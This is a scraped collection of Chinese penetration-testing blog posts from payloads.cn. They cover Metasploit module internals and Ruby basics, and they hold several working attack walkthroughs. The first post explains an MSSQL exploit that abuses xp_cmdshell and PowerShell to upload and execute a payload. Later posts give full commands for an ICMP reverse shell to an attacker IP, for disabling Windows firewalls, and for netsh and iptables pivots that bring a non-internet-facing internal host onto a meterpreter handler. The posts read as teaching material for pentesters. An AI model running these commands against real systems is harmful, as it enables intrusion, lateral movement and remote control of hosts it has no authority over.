&#x27;DefaultTarget&#x27; =&gt; 0, )) 基本选项 Boolean 布尔选项类型 https://rapid7.github.io/metasploit-framework/api/Msf/OptBool.html Required (参数是否为必填项) “false” Current Setting (当前的设置) “true” 即默认使用 PowerShell 1234register_options( [ OptBool.new(&#x27;UsePowerShell&#x27;, [ true, &quot;Use Powershell as payload delivery method instead&quot;,true ]) ]) 检查目标是否存在漏洞可被利用1234567891011121314151617def check if !mssql_login_datastore vprint_status(&quot;Invalid SQL Server credentials&quot;) return Exploit::CheckCode::Detected end # 查询mssql版本 mssql_query(&quot;select @@version&quot;, true) if mssql_is_sysadmin vprint_good &quot;User #&#123;datastore[&#x27;USERNAME&#x27;]&#125; is a sysadmin&quot; Exploit::CheckCode::Vulnerable else Exploit::CheckCode::Safe end ensure disconnect end 启用xpcmdshell先以SQLTOOLS工具尝试 回到代码中，引用mssql.rb中的mssql_xpcmdshell方法 123def run mssql_xpcmdshell(datastore[&#x27;CMD&#x27;], true) if mssql_login_datastoreend 定义主体代码定义upload_powershell_exec主要函数，exe是从下面Msf::Util::EXE.to_win32pe(framework,payload.encoded)发过来的二进制文件 1def upload_powershell_exec(exe, debug=false) 调试状态下debug=true的输出 十六进制转换，创建随机文件名，输出状态 123456# 十六进制转换，“H:打开二进制格式的文件，以十六进制转换“hex = exe.unpack(&quot;H*&quot;)[0]# 创建随机8位字母的文件名var_payload = rand_text_alpha(8)# payload保留在目标系统 C:\\Windows\\\\Temp\\ 目录下print_status(&quot;Warning: This module will leave #&#123;var_payload&#125;.exe in the SQL Server C:\\\\Windows\\\\Temp\\\\ directory&quot;) 通过powershell创建一个从十六进制至二进制的转换：$s变量中的 `r 与 `n替换空字符，去除回车换行符，由于MSSQL存在一个字符长度限制，需要将十六进制的payload分成500字节分块，payload被分到多个请求中，传到目标系统中就会被添加回车换行符。如不去除，生成的二进制文件将损坏，就不能执行；通过[Convert]::ToByte 让powershell将十六进制的文件写入到 #&#123;var_payload&#125;.exe 二进制程序中 1h2b = &quot;$s = gc &#x27;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&#x27;;$s = [string]::Join(&#x27;&#x27;, $s);$s = $s.Replace(&#x27;`r&#x27;,&#x27;&#x27;); $s = $s.Replace(&#x27;`n&#x27;,&#x27;&#x27;);$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %&#123;$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)&#125;;[IO.File]::WriteAllBytes(&#x27;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;.exe&#x27;,$b)&quot; 转换编码，输出状态 123456# 将h2b字符串转换为Unicode编码h2b_unicode=Rex::Text.to_unicode(h2b)# 将Unicode字符串进行base64编码h2b_encoded = Rex::Text.encode_base64(h2b_unicode)# 输出状态，正在上传payloadprint_status(&quot;Uploading the payload #&#123;var_payload&#125;, please be patient...&quot;) 计数器idx每次增长cnt(500)个字节。简单说：读取500字节，发送，再读取，再发送，直到读到文件末尾。 12345678# 基础计数器idx最初位置为0，标识文件末尾idx = 0# 每次发送十六进制文件到操作系统时递增500字节。cnt = 500while(idx &lt; hex.length - 1) mssql_xpcmdshell(&quot;cmd.exe /c echo #&#123;hex[idx, cnt]&#125;&gt;&gt;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&quot;, false) idx += cntend 利用PowerShell EncodedCommand命令转换payload，之后执行，输出相关状态 123456print_status(&quot;Converting the payload utilizing PowerShell EncodedCommand...&quot;)mssql_xpcmdshell(&quot;powershell -EncodedCommand #&#123;h2b_encoded&#125;&quot;, debug)mssql_xpcmdshell(&quot;cmd.exe /c del C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;&quot;, debug)print_status(&quot;Executing the payload...&quot;)mssql_xpcmdshell(&quot;C:\\\\Windows\\\\Temp\\\\#&#123;var_payload&#125;.exe&quot;, false, &#123;:timeout =&gt; 1&#125;)print_status(&quot;Be sure to cleanup #&#123;var_payload&#125;.exe...&quot;) 攻击模块的主体代码使用12345678910111213def exploit # 检查是否已经正常登陆 if !mssql_login_datastore # 口令错误无法登陆输出该状态 “[*] xx.xx.xx.xx:1433 - Invalid SQL Server credentials” print_status(&quot;Invalid SQL Server credentials&quot;) return end # UsePowerShell 方法调用 upload_powershell_exec 函数 if (datastore[&#x27;UsePowerShell&#x27;]) # Msf::Util::EXE.to_win32pe(framework,payload,encoded) 自动产生一个可用的二进制payload # https://rapid7.github.io/metasploit-framework/api/Msf/Util/EXE.html#to_win32pe-class_method upload_powershell_exec(Msf::Util::EXE.to_win32pe(framework,payload.encoded)) end 处理与目标系统间的连接12handlerdisconnect 完整载入运行1234567msf5 &gt; loadpath /Users/anonysec/Desktop/Metasploit/msf5 &gt; use exploit/windows/mssql/mssql_powershellmsf5 exploit(windows/mssql/mssql_powershell) &gt; set payload windows/meterpreter/bind_tcpmsf5 exploit(windows/mssql/mssql_powershell) &gt; set rhost 192.168.144.212msf5 exploit(windows/mssql/mssql_powershell) &gt; set password Admin123msf5 exploit(windows/mssql/mssql_powershell) &gt; set lport 5353msf5 exploit(windows/mssql/mssql_powershell) &gt; run 注：调试状态下debug=true 小结只要对Metasploit框架有兴趣，并已经查看了现有代码是如何工作的，就可以充分利用现有代码，拿过来改改，并增加一些原创代码这样的流程。在大多数情况下，没必要完全从零开始来编写自己的模块代码。这就是代码重用的能量。 References Metasploit API Metasploit WIKI 《Metasploit: The Penetration Tester’s Guide》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—分析HTTP模块","slug":"打造定制化的Metasploit—分析HTTP模块","date":"2020-03-02T01:11:13.000Z","updated":"2021-07-07T07:11:43.578Z","comments":true,"path":"2020/0302/.html","link":"","permalink":"https://payloads.cn/2020/0302/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 分析HTTP扫描模块分析的模块位于/modules/auxiliary/scanner/http/http_version.rb 首先来看模块头的引入与类的定义： 12345678### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require &#x27;rex/proto/http&#x27; class MetasploitModule &lt; Msf::Auxiliary require &#39;rex/proto/http&#39;表示该模块将要引入这个rex库文件目录下的所有http协议方法，所有的模块都可以被调取使用。包括用于设置连接的函数，get和post的请求和响应处理等。 Msf::Auxiliary定义了该代码的类为辅助模块。 如下为/lib/rex/proto/http目录下的内容： [注：继承有助于重用代码和快速执行，不幸的是，Ruby不支持多继承，但是Ruby支持mixins。mixin就像是多继承的一个特定实现，在多继承中，只有接口部分是可继承的。] 12345# Exploit mixins should be called first(首先调用渗透模块mixins类)include Msf::Exploit::Remote::HttpClientinclude Msf::Auxiliary::WmapScanServer# Scanner mixin should be near last(接着是扫描模块mixins类)include Msf::Auxiliary::Scanner 上面代码所必需库文件中涵盖了编写模块所需要的所有方法，这些库文件的详细信息如下： 语句 引入路径 用途 Msf::Exploit::Remote::HttpClient /lib/msf/core/exploit/http/client.rb 这个库文件提供了大量方法，例如连接到目标计算机、发送请求、切断与客户端的连接等。 Msf::Auxiliary::WmapScanServer /lib/msf/core/auxiliary/wmapmodule.rb wmap是一款基于Metasploit的通用Web应用程序扫描框架，有助于完成Metasploit的Web渗透测试。 Msf::Auxiliary::Scanner /lib/msf/core/auxiliary/scanner.rb 这个文件包含了基于扫描模块的所有函数，提供了模块运行、模块初始化、扫描进度等各种方法。 这个initialize方法是Ruby编程语言中的默认构造方法。它定义了名称Name、描述Description、作者Author、许可License等。许可就是&#39;License&#39; =&gt; MSF_LICENSE，最后用一个end结束。 12345678910111213def initialize super( &#x27;Name&#x27; =&gt; &#x27;HTTP Version Detection&#x27;, &#x27;Description&#x27; =&gt; &#x27;Display version information about each system.&#x27;, &#x27;Author&#x27; =&gt; &#x27;hdm&#x27;, &#x27;License&#x27; =&gt; MSF_LICENSE ) register_wmap_options(&#123; &#x27;OrderID&#x27; =&gt; 0, &#x27;Require&#x27; =&gt; &#123;&#125;, &#125;) end 最后这段代码才是真正干活做事的： 123456789101112def run_host(ip) begin connect res = send_request_raw(&#123; &#x27;uri&#x27; =&gt; &#x27;/&#x27;, &#x27;method&#x27; =&gt; &#x27;GET&#x27; &#125;) fp = http_fingerprint(:response =&gt; res) print_good(&quot;#&#123;ip&#125;:#&#123;rport&#125; #&#123;fp&#125;&quot;) if fp report_service(:host =&gt; rhost, :port =&gt; rport, :sname =&gt; (ssl ? &#x27;https&#x27; : &#x27;http&#x27;), :info =&gt; fp) rescue ::Timeout::Error, ::Errno::EPIPE ensure disconnect end end 先来解释下在本段代码中所使用的重要函数： 函数 引入库文件 用途 run_host /lib/msf/core/auxiliary/scanner.rb 使用IP与所需主机建立连接 connect /lib/msf/core/exploit/http/client.rb 与目标服务器建立一个HTTP类型的连接 send_request_raw /lib/msf/core/exploit/http/client.rb 用来向目标发送原始的HTTP请求 http_fingerprint /lib/msf/core/exploit/http/client.rb 将HTTP响应解析为可以使用的变量 在这里会产生疑问，就是从代码上下文中根本不清楚函数的具体定义，该如何解决？这时就需要查询Metasploit API官方文档。 下面来具体查询分析下： run_host 在run方法中，作用是与所需主机建立连接。 begin意味着代码块的开始。 如果连接成功，就进行到connect方法，用于与目标服务器建立一个HTTP类型的连接。 之后使用send_request_raw方法，连接到服务器，创建请求，发送请求，读取响应。并将这个方法的参数URI的值设置为/，参数method的值设置为GET，将这个响应保存在res变量。 res = send_request_raw(&#123; &#39;uri&#39; =&gt; &#39;/&#39;, &#39;method&#39; =&gt; &#39;GET&#39; &#125;) 如果连接成功，使用http_fingerprint方法，记录和过滤信息。如：Set-cookie、Powered-by等。 接着再把收到的响应信息赋值给res，意味着将根据之前发送请求的响应数据进行特征匹配。 fp = http_fingerprint(:response =&gt; res) 之后对这些响应数据进行输出打印。 最后，rescue ::Timeout::Error, ::Errno::EPIPE 将会在模块超时的情况下处理程序的异常。 可见，输出的格式对应print_good(&quot;#&#123;ip&#125;:#&#123;rport&#125; #&#123;fp&#125;&quot;) if fp References Metasploit API Metasploit WIKI 《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—体系框架","slug":"打造定制化的Metasploit—体系框架","date":"2020-02-28T11:10:05.000Z","updated":"2021-07-07T07:13:35.022Z","comments":true,"path":"2020/0228/.html","link":"","permalink":"https://payloads.cn/2020/0228/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn Metasploit框架结构Metasploit的体系框架结构示意图如下： 文件结构Metasploit中的文件结构如下： 目录 用途 lib 包含Metasploit模块的全部重要库文件 (Metasploit的核心与灵魂) modules 包含Metasploit中的所有模块 tools 包含用于辅助渗透测试的命令行程序 plugins 包含所有用于扩展Metasploit功能的插件，例如OpenVAS、Nessus… scripts 包含Meterpreter和其他各种脚本 库的布局Metasploit的模块是由各种各样的函数构成的。这些函数包括各种基础库文件以及使用Ruby 编写的通用程序。在使用这些函数之前，首先要知道这些函数是什么，如何使用这些函数，调用 函数时需要传递多少个参数?更重要的是，这些函数的返回值会是什么? 库的实际位置重要的rex库文件位于/lib目录下:（在/lib下还包含了各种服务的重要目录） 另外两个重要的库/base和/core位于/msf目录下: /msf/core库文件提供核心的辅助模块 core/exploits/目录是Metasploit模块广泛使用的库文件 core/目录下还可以找到支持各种类型模块的所有相关库文件(渗透、攻击载荷、后渗透、编码器和各种其他模块的core库) 重要文档通过以上对Metasploit框架结构的介绍，已经有所熟悉。接下来，在打造定制化的Metasploit过程中，可以结合官方文档，下面列出一些比较重要的文档供参考： 搭建Metasploit开发环境，创建一个专门用来开发的Metasploit版本 msf5：官方文档 中文文档 社区贡献指南，请参照官方给出的代码规范进行开发：官方文档 中文文档 Metasploit API，能够查询大量的类、模块、函数定义等等：官方文档 一些其他的开发技能，包括但不局限于 git使用、ruby 语法、Metasploit 使用了解等。 模块格式首先，开发的Metasploit模块，最好的办法就是先深入理解它现有模块的内部机制，看看是如何工作的。 Metasploit通用的框架头部如下： 12345678910111213141516171819require &#x27;msf/core&#x27;class MetasploitModule &lt; Msf::Auxiliary def initialize(info = &#123;&#125;) super( update_info( info, &#x27;Name&#x27; =&gt; &#x27;Sample Auxiliary Module&#x27;, # The description can be multiple lines, but does not preserve formatting. &#x27;Description&#x27; =&gt; &#x27;Sample Auxiliary Module&#x27;, &#x27;Author&#x27; =&gt; [&#x27;Joe Module &lt;joem@example.com&gt;&#x27;], &#x27;License&#x27; =&gt; MSF_LICENSE, ) ) end def run # Main function end 一个框架一般都会从使用require关键字导入重要的库文件开始，上面的代码就导入了msf/core库。所以，这个框架中就包含了msf目录下的core库文件。 接下来主要是使用MetasploitModule指定这个类的类型。在定义类型的那行中，需要定义类的用途。上面代码定义了类的用途为MSF::Auxiliary。 initialize方法是Ruby编程语言中的默认构造方法。在这个方法中，我们定义了名称 (Name)、描述(Description)、作者(Author)、许可(License)等。许可就是&#39;License&#39; =&gt; MSF_LICENSE。 辅助模块中的主函数是run方法，除非要使用特别多的方法,否则所有的操作都应该在这个函数里面执行。但是程序仍然要从run方法开始执行。 References Metasploit API Metasploit WIKI 《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"打造定制化的Metasploit—认识Ruby","slug":"打造定制化的Metasploit—认识Ruby","date":"2020-02-20T07:09:30.000Z","updated":"2021-07-07T07:13:18.564Z","comments":true,"path":"2020/0220/.html","link":"","permalink":"https://payloads.cn/2020/0220/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言Ruby编程语言可以说是Metasploit框架的核心，想要学习好Metasploit模块编写必须要会Ruby。不过Ruby到底是什么呢？根据Ruby官方网站的说法：”Ruby一门开源的动态编程语言，注重简洁和效率。Ruby 的句法优雅，读起来自然，写起来舒适。”（引自Ruby中文官网）简单来说，Ruby是一种简单快捷的面向对象（面向对象程序设计）脚本语言。ruby 另以”红宝石”命名。 本文只讲解涉及编写Metasploit模块所必需的Ruby知识，如需更多介绍可以查阅Ruby教程，进行学习。 创建第一个ruby程序如需了解Ruby的安装过程，可自行百度，本文不进行讲解。 下载Ruby Ruby的交互式命令行这里直接使用Kali系统自带的Ruby环境，跟Python等语言一样，ruby也有命令交互的，输入irb即可进入到命令行交互操作。 下面做个 计算 与 赋值 的简单操作： 命令行中定义方法方法或函数是一组语句，当强调它们时就会执行。在使用Metasploit模块时，Ruby的方法是一个很重要的部分。语法格式： 123def method_name [( [arg [= default]]...[, * arg [, &amp;expr ]])] expr..end 首先已def开始，end声明放在最后来结束对方法的定义，arg指的是方法所接收的参数，expr指的是用来接受并计算的表达式。 下面定义一个函数方法： 可以看到，函数通过运算打印出了正确的结果。Ruby语言提供了puts和print这两种输出打印函数。当涉及Metasploit时，将使用print_line函数。 下面分别使用print_line、print_good、print_error、print_warning、print_status、与print_blank_line语句来表示行、成功执行、错误执行、警告、状态与换行： 12345678def run print_line(&quot;---&quot;) print_good(&quot;successful&quot;) print_error(&quot;error&quot;) print_warning(&quot;warning&quot;) print_status(&quot;status&quot;) print_blank_line end Ruby中的变量和数据类型变量是指一个值可以随时改变的占位符。Ruby语言支持众多的数据类型，但只讲解与Metasploit相关的数据类型。 字符串处理使用Ruby语言编写Metasploit模块时，尽量使用双引号标记，因为单引号可能会产生问题： 字符串连接将两个不同结果连接成一个字符串，使用+运算符实现字符串的连接；当需要一个变量后面追加数据的时候，可以使用&lt;&lt;运算符： 子字符串substring函数 split函数 Ruby中的数字和转换在处理用户输入是，可以用to_i函数将字符串类型的输入转换成数字；另外，可以用to_s函数将一个数字转换成字符串。 数制转换 16进制到10进制的转换 10进制到16进制的转换 范围范围(range)是一个很重要的内容，广泛应用在Metasploit的辅助模块中。例如auxiliary… 一个范围的对象提供多种操作：搜索、查找最小值与最大值、显示范围中的所有数据。这里include?函数可以检查范围中是否包含某一个特定的值。此外，min与max分别显示范围中的最小值和最大值。 Ruby中的循环迭代语句被称为循环。Ruby的语法和其他编程语言的不同之处： 123456def for1(a) for i in 0..a print (&quot;This number is #&#123;i&#125;\\n&quot;) endendfor1 (10) 这里使用#&#123;i&#125;去打印输出的变量i的值,关键字\\n指定开始新的一行。 而迭代循环是通过each实现的，在Metasploit模块中被广泛使用。 12345678def each_example(a) a.each do |i| print i.to_s + &quot;\\t&quot; endenda=Array.new(5)a=[5,10,15,20,25]each_example(a) 定义一个方法，并接收数组a，再用each循环打印出来。 References Metasploit API Metasploit WIKI 《Mastering Metasploit - Third Edition》","categories":[{"name":"开发","slug":"开发","permalink":"https://payloads.cn/categories/%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Metasploit","slug":"Metasploit","permalink":"https://payloads.cn/tags/Metasploit/"}]},{"title":"Reverse ICMP Shell","slug":"Reverse-ICMP-Shell","date":"2020-02-12T08:54:27.000Z","updated":"2021-07-07T07:17:05.587Z","comments":true,"path":"2020/0212/.html","link":"","permalink":"https://payloads.cn/2020/0212/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 前言内网中的大多数系统都位于防火墙或其他安全设备之后，以便控制入口以及出口流量。防火墙可以拦截到反连的shell，但ICMP协议基本上是不拦截的。因此，为了获得shell并在目标主机上执行命令，可以使用ICMP协议作为隐藏通道进行连接。 实例讲解服务端禁ping必须开启，才能正常通过ICMP反弹Shell。 1sysctl -w net.ipv4.icmp_echo_ignore_all=1 起初运行 run.sh会报错，是因为run.sh未把本地IP提取出来。(run.sh里调用的是icmpsh_m.py) 1234git clone https://github.com/inquisb/icmpsh.gitcd icmpsh/chmod 777 run.sh./run.sh 这里改下就好了，将 12IPINT=$(ifconfig | grep &quot;eth&quot; | cut -d &quot; &quot; -f 1 | head -1)IP=$(ifconfig &quot;$IPINT&quot; |grep &quot;inet addr:&quot; |cut -d &quot;:&quot; -f 2 |awk &#x27;&#123; print $1 &#125;&#x27;) 改成 1IP=$(ifconfig | grep &#x27;inet &#x27;| grep -v &#x27;127.0.0.1&#x27; | awk &#x27;&#123; print $2&#125;&#x27;) 成功运行run.sh，开启本地监听。 客户端Windows将icmpsh.exe传到目标机中，执行上述命令。 12345icmpsh.exe -t &lt;Attacker IP&gt; -d 500 -b 30 -s 128-d milliseconds 以毫秒为单位的请求之间的延迟 (默认 200)-b num 最大空白数 (未答复的ICMP请求)-s bytes 以字节为单位的最大数据缓冲区大小 (默认 64 字节) 攻击机成功接收到反弹会话，并且也可以通过这个管道来执行系统命令。 通过wireshark抓包分析，攻击机与目标机通信过程中均是由ICMP协议进行数据包传输的。 Linux该版本的liunx客户端是在icmpsh项目上进行改动的，但也是与icmpsh_m.py结合使用。 执行前要保证是root权限，或者 net.ipv4.ping_group_range /proc/sys/ 允许在其他用户上运行。 1234git clone https://github.com/ewilded/icmpsh-s-linux.gitcd icmpsh-s-linux/gcc icmpsh-s-linux.c -o icmpsh-s-linux./icmpsh-s-linux -t 192.168.199.131 -v 攻击机运行如下命令： 1python icmpsh_m.py &lt;Attacker IP&gt; &lt;Target IP&gt; 总结此Shell，是通过ICMP来进行请求/响应。这也是唯一与目标机通信的方式。当退出shell时，会重新启用ICMP响应，如果禁用则会继续。 Referencehttp://inquisb.github.io/icmpsh/ https://github.com/ewilded/icmpsh-s-linux","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"利用netsh进行端口转发","slug":"利用netsh进行端口转发","date":"2020-02-09T08:47:35.000Z","updated":"2021-07-07T07:15:28.489Z","comments":true,"path":"2020/0209/.html","link":"","permalink":"https://payloads.cn/2020/0209/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 简介自Windows XP开始，Windows中就内置网络端口转发的功能。任何传入到本地端口的TCP连接（IPv4或IPv6）都可以被重定向到另一个本地端口，或远程计算机上的端口，并且系统不需要有一个专门用于侦听该端口的服务。 对于渗透来说，也是一款非常好用的工具。比如：进行各类常规 tcp、udp 端口 ”正向” 转发以及对指定防火墙规则的各种增删操作等。 命令语法关于netsh端口转发的命令语法如下： 1netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport listenaddress – 等待连接的本地IP地址。 listenport – 本地侦听TCP端口。 connectaddress – 将传入连接重定向到本地或远程IP地址（或DNS名称） connectport – 远程端口 防火墙管理在 windows2003下使用netsh，需要先安装好ipv6支持，由于netsh同时支持ipv4和ipv6端口转发，如果不装，netsh工作可能会有些问题。 1netsh interface ipv6 install 装完后立马重启系统 Win2003 之前系统关于netsh在2003下的操作命令相对于之后的系统有所不同 123netsh firewall show state 查看当前系统防火墙状态netsh firewall set opmode disable 关闭当前系统防火墙netsh firewall set opmode enable 启用当前系统防火墙 Win2003 之后系统12345netsh advfirewall show allprofiles 查看当前系统所有网络类型的防火墙状态,比如,私有,公共,域网络 关闭当前系统防火墙netsh advfirewall set allprofiles state off 关闭当前系统防火墙netsh advfirewall set allprofiles state on 启用当前系统防火墙netsh advfirewall reset 重置当前系统的所有防火墙规则,会初识到刚装完系统的状态netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot; 自定义防火墙日志位置 增删操作1234567add 增加规则delete 删除规则allow 允许连接block 阻断连接in 入站out 出站name 要显示的规则名称 实例说明环境准备☁️VPS攻击机 192.168.199.246 ☁️目标边界Windows 2008服务器（出网） 内网IP 192.168.144.202 目标内网Widnwos 2003服务器(不出网) 内网IP 192.168.144.155 利用场景RDP端口转发通过☁️目标边界2008服务器访问目标内网2003服务器的远程桌面RDP： 【注：边界服务器执行netsh】 1234netsh advfirewall firewall add rule name=&quot;2003-rdp&quot; dir=in action=allow protocol=TCP localport=33389 netsh interface portproxy add v4tov4 listenport=33389 connectaddress=192.168.144.155 connectport=3389netsh interface portproxy show all 查看所有转发规则netstat -ano | findstr 33389 通过连接☁️边界2008服务器成功登录到内网2003服务器。 端口转发利用后，将转发规则删除。 123netsh advfirewall firewall delete rule name=&quot;2008-rdp&quot; dir=in protocol=TCP localport=33389netsh interface portproxy delete v4tov4 listenport=33389netsh interface portproxy show all Metasploit上线通过☁️边界2008服务器把其内网2003服务器(不出网)通过payload上线到☁️VPS攻击机的metasploit上。 1234netsh advfirewall firewall add rule name=&quot;mete bind&quot; dir=in action=allow protocol=TCP localport=5353 netsh interface portproxy add v4tov4 listenport=5353 connectaddress=192.168.144.155 connectport=53netsh interface portproxy show allnetstat -ano | findstr 5353 通过msfvenom生成正向的payload，ahost为允许访问的机器，将该payload在内网2003服务器(不出网) 上执行。 1sudo msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;53 AHOST&#x3D;192.168.144.155 -f exe &gt; netsh.exe 接着，在☁️VPS攻击机启用metasploit监听后，内网2003服务器(不出网)成功上线。 1234567sudo msfconsole -qmsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcpmsf5 exploit(multi/handler) &gt; set ahost 192.168.144.155 #只允许访问IP(内网服务器IP)msf5 exploit(multi/handler) &gt; set rhost 192.168.144.202 #边界服务器IPmsf5 exploit(multi/handler) &gt; set lport 5353 #边界服务器portmsf5 exploit(multi/handler) &gt; run -j 端口转发利用后，将转发规则删除。 123netsh advfirewall firewall delete rule name=&quot;mete bind&quot; dir=in protocol=TCP localport=5353netsh interface portproxy delete v4tov4 listenport=5353netsh interface portproxy show all 建议 尽量选择穿透性较好的端口 用于转发的端口不能和目标系统中现有的端口冲突 ……","categories":[{"name":"端口转发","slug":"端口转发","permalink":"https://payloads.cn/categories/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"利用iptables进行端口转发","slug":"利用iptables进行端口转发","date":"2020-02-09T08:40:18.000Z","updated":"2021-07-07T07:15:24.266Z","comments":true,"path":"2020/0209/.html","link":"","permalink":"https://payloads.cn/2020/0209/.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。 ——AnonySec https://payloads.cn 简介iptables其实不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的“安全框架”中，这个“安全框架”才是真正的防火墙，这个框架的名字叫netfilter。它才是防火墙真正的安全框架(framework)，netfilter位于内核空间。 所以，可以理解为：iptables其实是一个命令行工具，位于用户空间，我们用这个工具操作真正的框架。 规则编写1iptables table command chain Parameter&amp;Xmatch target #表名 命令 链名 匹配条件 目标动作或跳转 参数详解关于端口转发常用选项的简要说明： 12345678910-t #指定表-A #在指定的链结尾追加一条新规则-D #删除指定链中的某条规则-L #打印指定链的所有规则列表 -P #设置为指定链的默认规则 -d #指明数据包的目的 ip-s #指明数据包的源 ip-p #指明协议,如,tcp,udp,icmp -m #扩展选项-j #指明实际的处理动作 四表五链初步认识iptables四表五链的一些工作特性： 四表： 1234Filter #主要用于对数据包进行过滤，根据具体的规则决定是否放行该数据包。Nat #主要用于修改数据包的IP地址 端口信息等(网络地址转换)。Mangle #主要用于修改数据包的TOS TTL 以及数据包设置的mark标记。Raw #主要用于决定数据包是否被状态跟踪机制处理。在匹配数据包时，raw表的规则要优先于其他表。 五链： 12345INPUT #用于修改数据包的服务类型,TTL... 决定数据包是否被状态跟踪机制处理OUTPUT #处理来自外部的数据包 [相当于 windows 防火墙的入站]FORWARD #处理流向外部的数据包 [相当于 windows 防火墙的出站] PREROUTING #将数据直接转发到本机的其它网卡接口上 对数据包作路由选择前应用此链中的规则[所有的数据包进来时都先由此链处理] POSTROUTING #对数据包作路由选择后应用此链中的规则[所有的数据包出来的时侯都先由这个链处理] 各表对应规则链如下： 常用命令基本命令 1234iptables -t nat -A PREROUTING -p tcp --dport [端口号] -j DNAT --to-destination [目标IP]iptables -t nat -A PREROUTING -p udp --dport [端口号] -j DNAT --to-destination [目标IP]iptables -t nat -A POSTROUTING -p tcp -d [目标IP] --dport [端口号] -j SNAT --to-source [本地服务器IP]iptables -t nat -A POSTROUTING -p udp -d [目标IP] --dport [端口号] -j SNAT --to-source [本地服务器IP] 多端口转发修改方案： ( 将本地服务器的 5000065535 转发至目标 IP 为 1.1.1.1 的 5000065535 端口 ) 1234iptables -t nat -A PREROUTING -p tcp -m tcp --dport 50000:65535 -j DNAT --to-destination 1.1.1.1iptables -t nat -A PREROUTING -p udp -m udp --dport 50000:65535 -j DNAT --to-destination 1.1.1.1iptables -t nat -A POSTROUTING -d 1.1.1.1 -p tcp -m tcp --dport 50000:65535 -j SNAT --to-source [本地服务器IP]iptables -t nat -A POSTROUTING -d 1.1.1.1 -p udp -m udp --dport 50000:65535 -j SNAT --to-source [本地服务器IP] 非同端口号修改方案：（使用本地服务器的 60000 端口来转发目标 IP 为 1.1.1.1 的 50000 端口） 1234iptables -t nat -A PREROUTING -p tcp -m tcp --dport 60000 -j DNAT --to-destination 1.1.1.1:50000iptables -t nat -A PREROUTING -p udp -m udp --dport 60000 -j DNAT --to-destination 1.1.1.1:50000iptables -t nat -A POSTROUTING -d 1.1.1.1 -p tcp -m tcp --dport 50000 -j SNAT --to-source [本地服务器IP]iptables -t nat -A POSTROUTING -d 1.1.1.1 -p udp -m udp --dport 50000 -j SNAT --to-source [本地服务器IP] 查看 NAT 规则 1iptables -t nat -vnL 删除 NAT 规则通过上面的查看规则命令，查看规则后，确定你要删除的规则的顺序，下面的命令是删除第一个规则。 12iptables -t nat -D PREROUTING 1iptables -t nat -D POSTROUTING 1 实例说明环境准备☁️VPS攻击机 192.168.199.246 ☁️目标边界Linux web服务器（出网） 内网IP 192.168.144.203 目标内网Widnwos web服务器(不出网) 内网IP 192.168.144.211 开启路由转发首先，在目标边界服务器上的开启系统路由转发功能： 123sed -i &#x27;/net.ipv4.ip_forward/ s/\\(.*= \\).*/\\11/&#x27; /etc/sysctl.confgrep &quot;net.ipv4.ip_forward&quot; /etc/sysctl.confsysctl -p #使用命令让配置马上生效 利用场景RDP端口转发通过☁️目标边界服务器访问目标内网服务器的远程桌面RDP： 1/sbin/iptables -P INPUT ACCEPT #默认输入为允许 将192.168.144.203的5353端口的全部数据包转换为目的192.168.144.211的3389端口上，这一步只是先把数据包地址转换过来。 【注：192.168.144.203的5353端口为开放状态】 1iptables -t nat -A PREROUTING -d 192.168.144.203 -p tcp -m tcp --dport 5353 -j DNAT --to-destination 192.168.144.211:3389 通俗来讲就是告诉iptables，目的192.168.144.211的3389端口的数据包都从192.168.122.144这个地址上走，这样就能访问到指定的目标内网机器 。 1iptables -t nat -A POSTROUTING -d 192.168.144.211 -p tcp -m tcp --dport 3389 -j SNAT --to-source 192.168.144.203 将转发规则从eth0网卡流出。 1iptables -A FORWARD -o eth0 -d 192.168.144.211 -p tcp --dport 3389 -j ACCEPT 保存iptables设置并重启。 1/etc/init.d/iptables save &amp;&amp; /etc/init.d/iptables restart 查看 iptables 的 NAT 规则。 1iptables -t nat -vnL 